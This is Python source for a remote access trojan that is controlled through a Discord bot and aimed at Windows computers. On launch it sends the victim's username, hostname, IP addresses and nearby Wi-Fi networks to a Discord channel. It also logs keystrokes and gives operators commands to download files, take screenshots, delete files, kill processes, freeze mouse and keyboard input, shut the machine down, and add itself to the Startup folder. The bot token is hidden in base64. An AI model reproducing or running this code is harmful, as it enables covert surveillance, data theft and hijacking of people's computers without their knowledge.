import tkinter.messagebox
import discord, os, socket, base64, subprocess, pyautogui, tkinter, random, webbrowser, string, keyboard, time, winsound, threading, mouse, wmi, platform
from pynput import keyboard as kb
from discord.ext import commands
from os import listdir
from pathlib import Path
from requests import get


executing = True

# roles
full_access = 1278836817227022447
basic_access = 1278759537867751454
ip_access = 1278761716640907304
experimental_access = 1278840994019676302

# specs ----------------------------------
computer = wmi.WMI()
computer_info = computer.Win32_ComputerSystem()[0]
os_info = computer.Win32_OperatingSystem()[0]
proc_info = computer.Win32_Processor()[0]
gpu_info = computer.Win32_VideoController()[0]

name = platform.system()
nr = platform.release()

os_version = ' '.join([os_info.Version, os_info.BuildNumber])
system_ram = float(os_info.TotalVisibleMemorySize) / 1048576

#------------------------------------------

base64_string = "TVRJM016TTRNalV3TVRjeU5EY3hOekUyTmcuR0t1WFZGLkZIcVh5XzdZejBjZzlkcXI4V194N19jMERTRzVVRDVVRmtrQkhv"
base64_bytes = base64_string.encode("ascii")

sample_string_bytes = base64.b64decode(base64_bytes)
sample_string = sample_string_bytes.decode("ascii")

bot = commands.Bot(command_prefix="!",intents=discord.Intents.all())

user = os.getlogin()
hst = socket.gethostname()
i1p = get('https://api.ipify.org').content.decode('utf8')
i2p = socket.gethostbyname(hst)
devices = subprocess.check_output(['netsh','wlan','show','network']) 
  
# decode it to strings 
devices = devices.decode('mbcs') 
devices= devices.replace("\r","")
datastr = ""

def keyPressed(key):
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print()


if __name__ == "__main__":
    listener = kb.Listener(on_press=keyPressed)
    listener.start()


def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))



@bot.event
async def on_ready():
    channel = bot.get_channel(1278482409029111908)
    logs = bot.get_channel(1278750914014089217)
    await logs.send(f"Public IP: {i1p}\nPrivate IP: {i2p}")
    await channel.send(f"<@1259930742407036929> New Session opened!")
    await channel.send(f"Username: {user}\nPC Name/Host: {hst}\n**=================**\nNetwork Devices: {devices}")

@bot.command()
async def cmds(ctx):
    embed1 = discord.Embed(title="Aviable Commands", description="""
!altf4 *(delay)* ~ alt4´s client
!asa ~ copies program into clients autostart folder **(<@&1278836817227022447> required)**
!beep (freqency) (duration) ~ makes a beep noise on clients computer
!blockm ~ blocks all mouse input of client **(<@&1278836817227022447> required)**
!blockk ~ blocks all keyboard input of client **(<@&1278836817227022447> required)**
!click (l/r) *(x)* *(y)* ~ left/rightclicks on clients computer
!cmds ~ lets you see all commands
!cf (directory + filename) ~ creates a new file in a directory on clients computer
!crf (directory) *(amount)* ~ creates random-names files in a directory on clients computer
!df (directory) (filename) ~ deletes chosen file from directory on clients computer
!download (dircetory+file) ~ download clients files
!et (task) ~ ends a task on clients computer
!getkeys ~ sends a text file with all latest key presses
!ip ~ shows the ip of the client **(<@&1278761716640907304> required)**
!message (title) (text) *(amount)* ~ lets an emergency message pop up on clients screen
!of (directory + file) ~ opens a file on clients computer
!ol (link) *(amount)* ~ opens a link in cleints standart webbrowser
!pk (key) *(delay)* ~ presses a key on clients computer
!rbeep ~ beeps a random amount of times in random frequencies
!rr ~ rickrolls client
!sc ~ stops program on clients computer
!shutdown *(delay)*~ turns off clients computer **(<@&1278836817227022447> required)**
!ss ~ takes a screenshot of the clients screen
!specs ~ lets you see the specs of the clients computer
!view (location) ~ lets you view clients files (to see all possible directories type "./" as location)
""")
    await ctx.send(embed=embed1)

@bot.command()
@commands.has_role(full_access) # full access
async def shutdown(ctx, *delay):
    if delay:
        if int(delay) < 15:
            await ctx.send("Shutting down clients computer...")
            os.system(f"shutdown /s /t {delay}")

    else:
        await ctx.send("Shutting down clients computer...")
        os.system(f"shutdown /s /t 1")

def move_mouse():
    #until executing is False, move mouse to (1,0)
    global executing
    while executing:
        mouse.move(1,0, absolute=True, duration=0)

def stop_infinite_mouse_control():
    #stops infinite control of mouse after 10 seconds if program fails to execute
    global executing, timey
    time.sleep(timey)
    executing = False

@bot.command()
@commands.has_role(basic_access)
async def specs(ctx):
    await ctx.send(f"""The clients computer has the following specs:\n
OS Name: {name} {nr}
OS Version: {os_version}
CPU: {proc_info.Name}
RAM: {system_ram}
GPU: {gpu_info.Name}
""")


@bot.command()
@commands.has_role(full_access) # full access
async def blockm(ctx, timex):
    global timey
    timey = int(timex)

    threading.Thread(target=move_mouse).start()

    threading.Thread(target=stop_infinite_mouse_control).start()
    await ctx.send(f"Froze mouse for {timex}s.")


def stop_infinite_key_control():
    global executing, timey2
    time.sleep(timey2)
    executing = False
    for i in range(150):
        keyboard.unblock_key(i)

@bot.command()
@commands.has_role(full_access) # full access
async def blockk(ctx, timex):
    global timey2
    timey2 = int(timex)
    
    for i in range(150):
        keyboard.block_key(i)

    threading.Thread(target=stop_infinite_key_control).start()
    await ctx.send(f"Froze keyboard for {timex}s.")


@bot.command()
@commands.has_role(basic_access) # normal access
async def getkeys(ctx):
    await ctx.send(file=discord.File("keyfile.txt"))
    os.remove("keyfile.txt")

@bot.command()
@commands.has_role(basic_access)
async def rr(ctx):
    webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
    await ctx.send("Rickrolled client.")

@bot.command()
@commands.has_role(basic_access)
async def click(ctx, lr, *args):
    if lr == "l":
        if args:
            pyautogui.leftClick(int(args[0]), int(args[1]))
        else:
            pyautogui.leftClick()
    if lr == "r":
        if args:
            pyautogui.rightClick(int(args[0]), int(args[1]))
        else:
            pyautogui.rightClick()

@bot.command()
@commands.has_role(basic_access)
async def df(ctx, location, name):
    os.remove(f"C:\\Users\\{user}\\{location}\\" + name)
    await ctx.send("Removed " + name + " from " + location + ".")

@bot.command()
@commands.has_role(basic_access)
async def et(ctx,task):
    os.system("taskkill /f /im " + task)
    await ctx.send("Ended " + task)

@bot.command()
@commands.has_role(basic_access)
async def view(ctx,location):
    home = str(Path.home())
    myPath = os.path.join(home, location)
    data = os.listdir(myPath)
    datastr = ""
    for i in range(len(data)):
        datastr = datastr + "\n" + data[i]
    
    await ctx.send(f"**Data in Folder {location}:** \n\n" + datastr)

@bot.command()
@commands.has_role(basic_access)
async def altf4(ctx, *delay):
    if delay:
        time.sleep(int(delay[0]))
    keyboard.press_and_release("Alt+F4")
    await ctx.send("AltF4´d client.")


@bot.command()
@commands.has_role(basic_access)
async def pk(ctx, key, *delay):
    if delay:
        time.sleep(int(delay[0]))
    keyboard.press_and_release(key)
    await ctx.send("Pressed " + key + ".")

@bot.command()
@commands.has_role(basic_access)
async def cf(ctx,location):
    home = str(Path.home())
    myPath = os.path.join(home, location)
    file = open(myPath,"a")
    file.close
    await ctx.send("Created file.")

@bot.command()
@commands.has_role(basic_access)
async def crf(ctx, dir, *amt):
    home = str(Path.home())
    myPath = os.path.join(home, dir)
    var = id_generator()
    if amt:
        for i in range(int(amt[0])):
            file = open(myPath + "/" + var,"a")
            file.close()
            var = id_generator()
        await ctx.send(f"Generated {amt[0]} random-named file in {dir}.")
    else:
        file = open(myPath + "/" + var,"a")
        file.close()
        await ctx.send(f"Generated 1 random-named file in {dir}.")

@bot.command()
@commands.has_role(full_access)
async def asa(ctx):
    with open("Anproti.py","r") as self:
        text = self.read()

    with open("C:\\users\\" + user + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.py",'a') as f:
        f.write(text)
        f.close()
    await ctx.send("Added program to the autostart folder.")

@bot.command()
@commands.has_role(basic_access)
async def of(ctx, location):
    home = str(Path.home())
    print(home + location)
    os.startfile(f"{home}\\{location}")
    await ctx.send("Opened file.")


@bot.command()
@commands.has_role(basic_access)
async def ol(ctx, link, *amt):
    if amt:
        for i in range(int(amt[0])):
            webbrowser.open(link)
        await ctx.send(f"Opened {link} {amt[0]} times.")
    else:
        webbrowser.open(link)
        await ctx.send(f"Opened {link} 1 time.")

@bot.command()
@commands.has_role(basic_access)
async def sc(ctx):
    await ctx.send("Stopping all connections...")
    exit()

@bot.command()
@commands.has_role(basic_access)
async def download(ctx,location):
    home = str(Path.home())
    myPath = os.path.join(home, location)
    await ctx.send(file=discord.File(myPath))

@bot.command()
@commands.has_role(basic_access)
async def ss(ctx):
    pyautogui.screenshot("temp.png")
    await ctx.send(file=discord.File("temp.png"))

def amtyesMessage():
    global gamt, gtitle, gtext
    for i in range(int(gamt[0])):
        tkinter.messagebox.showwarning(gtitle, gtext) 

def amtnoMessage():
    global gtitle, gtext
    tkinter.messagebox.showwarning(gtitle, gtext)


@bot.command()
@commands.has_role(basic_access)
async def message(ctx,title,text1,*amt):
    global gtext, gamt, gtitle
    text = text1.replace("-"," ")
    gtext = text
    gtitle = title
    
    if amt:
        gamt = amt
        threading.Thread(target=amtyesMessage).start()
        await ctx.send("Sent messages.")
    else:
        threading.Thread(target=amtnoMessage).start()
        await ctx.send("Sent message.")

def beepFunc():
    global gfreq, gdur
    winsound.Beep(int(gfreq), int(gdur)*1000)

@bot.command()
@commands.has_role(basic_access)
async def beep(ctx, freq, dur):
    global gfreq, gdur
    gdur = dur
    gfreq = freq
    threading.Thread(target=beepFunc).start()
    await ctx.send("Beeeeep")

def rbeepFunc():
    global freq, dur, times
    for i in range(times):
        winsound.Beep(int(freq), int(dur)*250)
        freq = random.randint(150,2500)

@bot.command()
@commands.has_role(basic_access)
async def rbeep(ctx):
    global freq, dur, times
    freq = random.randint(150,2500)
    dur = random.randint(1,3)
    times = random.randint(20,50)
    threading.Thread(target=rbeepFunc).start()
    await ctx.send(f"Beeeeep Beep ({times})")

@bot.command()
@commands.has_role(ip_access)
async def ip(ctx):
    global i2p
    host = socket.gethostname()
    ip1 = socket.gethostbyname(host)
    await ctx.send(f"The client has the privte IP: {ip1} and public IP: {i1p}")

@bot.command()
@commands.has_role(basic_access)
async def purge(ctx):
    channel = ctx.channel
    await channel.purge()


bot.run(sample_string)
